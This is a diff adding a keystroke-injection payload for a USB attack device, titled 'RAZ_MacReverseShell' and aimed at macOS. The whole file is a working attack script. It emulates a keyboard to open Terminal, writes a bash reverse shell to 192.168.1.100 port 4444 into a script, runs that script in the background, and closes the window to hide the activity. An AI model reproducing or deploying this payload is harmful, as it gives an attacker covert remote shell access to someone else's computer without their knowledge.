@@ -1,0 +1,51 @@
+#!/bin/bash
+#
+# Title:         RAZ_MacReverseShell
+# Author:        RalphyZ
+# Version:       1.0
+# Target:        Mac OSX
+# Dependencies:  None
+#
+# Description:   Starts a terminal window on a Mac,then creates a bash reverse
+#                shell inside a script, s.sh.  It then runs the script in the
+#                background and closes the terminal window.
+#
+# Colors:
+# Green (blinking)..........Working
+# White.....................Completed without error
+
+# Green blinking LED
+LED G 100
+
+# Human Interface Device
+ATTACKMODE HID
+
+# Emulate the Ducky - QUACK!
+QUACK DEFAULT_DELAY 200
+
+# Start the Mac Terminal
+QUACK COMMAND SPACE
+QUACK STRING terminal
+QUACK DELAY 500
+QUACK ENTER
+
+# Give the terminal window a second to pop up
+QUACK DELAY 1000
+
+# Bash Reverse Shell into a script 's.sh' *** Edit IP Address and Port ***
+QUACK STRING echo \"bash -i \>\& /dev/tcp/192.168.1.100/4444 0\>\&1\" \> s.sh
+QUACK ENTER
+
+# Change file permissions to allow execution
+QUACK STRING chmod +x s.sh
+QUACK ENTER
+
+# Execute the script in the background (&)
+QUACK STRING ./s.sh\&
+QUACK ENTER
+
+# Close the Terminal Window
+QUACK COMMAND Q
+
+# White LED for finished
+LED R G B
